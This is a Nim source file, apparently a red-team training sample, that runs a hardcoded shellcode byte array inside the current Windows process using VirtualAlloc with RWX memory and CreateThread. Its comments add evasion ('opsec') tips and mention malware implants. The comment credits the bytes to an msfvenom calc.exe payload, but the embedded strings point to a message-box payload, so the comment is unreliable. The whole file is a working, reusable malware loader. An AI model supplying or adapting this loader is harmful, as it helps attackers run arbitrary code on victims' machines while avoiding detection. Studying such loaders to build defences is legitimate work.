import winim/lean # Make sure Winim is installed ('nimble install winim')

# Note that we don't need any P/Invoke for Nim (compared to C#)
# This is because Winim takes care of all that for uss

# Define a function to inject (helps with automatic cleanup)
proc injectLocal[I, T](shellcode: var array[I, T]): void =

    # In this example, we use VirtualAlloc() to allocate memory for our shellcode and copy it
    # An equally suitable alternative would be to make our shellcode executable directly using VirtualProtect()

    # Allocate RWX (read-write-execute) memory to execute the shellcode from
    # Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode
    let executable_memory = VirtualAlloc(
        nil,
        len(shellcode),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    # Copy the shellcode into our assigned region of RWX memory
    copyMem(executable_memory, shellcode[0].addr, len(shellcode))

    # Create a thread at the start of the executable shellcode to run it!
    let tHandle = CreateThread(
        nil, 
        0,
        cast[LPTHREAD_START_ROUTINE](executable_memory),
        nil,
        0, 
        cast[LPDWORD](0)
    )
    # 'Defer' can be used to automatically close the handle when it is no longer required
    defer: CloseHandle(tHandle)

    # Wait for our thread to exit to prevent program from closing before the shellcode ends
    # This is especially relevant for long-running shellcode, such as malware implants
    # 'Discard' means that we don't care about the return value of WaitForSingleObject()
    discard WaitForSingleObject(tHandle, -1)

# Only execute when compiled for Windows (this is optional)
when defined(windows):
    # Define our shellcode as a Nim byte array
    # msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f nim
   
    var buf: array[327, byte] = [
    byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,
    0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,
    0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,0x3e,0x48,
    0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,0x0f,0xb7,
    0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,
    0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
    0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,
    0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,
    0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,0x18,0x3e,
    0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,
    0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,
    0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,
    0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,
    0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x3e,
    0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
    0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
    0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
    0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x3e,0x48,0x8b,
    0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,0x48,0x8d,0x8d,0x2f,
    0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,
    0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x0e,0x01,
    0x00,0x00,0x3e,0x4c,0x8d,0x85,0x23,0x01,0x00,0x00,0x48,0x31,
    0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,
    0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x54,0x61,0x63,0x68,
    0x65,0x20,0x72,0x61,0x74,0x65,0x72,0x20,0x73,0x75,0x63,0x63,
    0x65,0x73,0x73,0x21,0x00,0x45,0x72,0x72,0x65,0x75,0x72,0x21,
    0x20,0x3a,0x6f,0x20,0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,
    0x64,0x6c,0x6c,0x00]



    # Call our injector as part of the main function
    when isMainModule:
        injectLocal(buf)
